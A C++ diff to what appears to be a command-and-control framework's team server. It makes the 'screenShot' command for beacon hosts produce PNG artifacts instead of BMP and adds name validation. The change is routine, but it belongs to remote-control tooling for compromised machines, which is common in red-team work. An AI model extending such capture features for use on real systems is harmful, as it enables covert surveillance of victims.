@@ -63,6 +63,21 @@ bool endsWithExe(const std::string& path)
     return extensionLower(path) == ".exe";
 }
 
+std::string normalizeScreenshotNameHint(
+    const std::vector<std::string>& tokens,
+    std::string& errorMessage)
+{
+    std::string nameHint = tokens.size() == 2 ? tokens[1] : "screenshot.png";
+    const std::string extension = extensionLower(nameHint);
+    if (extension.empty())
+        return nameHint + ".png";
+    if (extension == ".png")
+        return nameHint;
+
+    errorMessage = "screenShot only supports PNG artifacts. Use a .png artifact name or omit the extension.";
+    return {};
+}
+
 TeamServerCommandPreparerResult handledError(C2Message& c2Message, const std::string& message)
 {
     TeamServerCommandPreparerResult result;
@@ -169,14 +184,19 @@ TeamServerCommandPreparerResult TeamServerModuleArtifactCommandPreparer::prepare
     if (!m_fileArtifactService)
         return handledError(c2Message, "File artifact service is not available.\n");
     if (tokens.size() > 2)
-        return handledError(c2Message, "Usage: screenShot [artifact_name]\n");
+        return handledError(c2Message, "Usage: screenShot [artifact_name.png]\n");
+
+    std::string nameError;
+    const std::string nameHint = normalizeScreenshotNameHint(tokens, nameError);
+    if (!nameError.empty())
+        return handledError(c2Message, nameError + "\n");
 
     TeamServerGeneratedFileArtifactSpec spec;
     spec.remotePath = "screen";
-    spec.nameHint = tokens.size() == 2 ? tokens[1] : "screenshot.bmp";
+    spec.nameHint = nameHint;
     spec.category = "screenshot";
     spec.source = "beacon";
-    spec.format = "bmp";
+    spec.format = "png";
     spec.runtime = "file";
     spec.description = "Screenshot captured from beacon host.";
     spec.tags = {"screenShot", "screenshot"};
